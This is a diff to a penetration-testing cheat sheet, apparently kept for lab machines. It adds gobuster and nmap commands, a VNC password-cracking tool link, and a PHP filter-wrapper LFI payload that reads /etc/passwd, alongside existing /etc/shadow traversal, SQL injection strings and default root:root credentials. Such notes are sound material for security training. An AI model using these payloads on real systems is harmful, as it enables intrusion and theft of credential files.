@@ -34,6 +34,7 @@ Contents
                nmap --script-updatedb
     1.3 AutoRecon — https://github.com/Tib3rius/AutoRecon
     1.4 gobuster dir -u http://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -k 
+        gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 30
     	gobuster with proxy
 	   Burpsuite: proxy--> options --> proxy listener --> add
 	   	Binding - Bind to port: < desired port >
@@ -285,6 +286,11 @@ Contents
             4555 James Remote Server
                 default userid:password
                     root:root
+	    5353 zeroconf
+	    	nmap -Pn -sUC -p5353 ip
+  	    5901 VNCviewer
+	    	https://github.com/jeroennijhof/vncpwd
+		
                     
             
         
@@ -312,11 +318,14 @@ Contents
 
 	
       LFIs
-        https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
+        https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
          Linux 
              'LFI - php?list=../../../../../../../../../../etc/shadow'
+	 php wrapper
+	 	.php?file=php://filter/convert.base64-encode/resource=../../../../../../../../../../../etc/passwd
          Windows
              'LFI -php?list=../../../../../../../../../../<>>>>'
+	     
       SQL Injection     #Examine how the server behaves
             ' or '1'='1
             ' or 1=1-- -
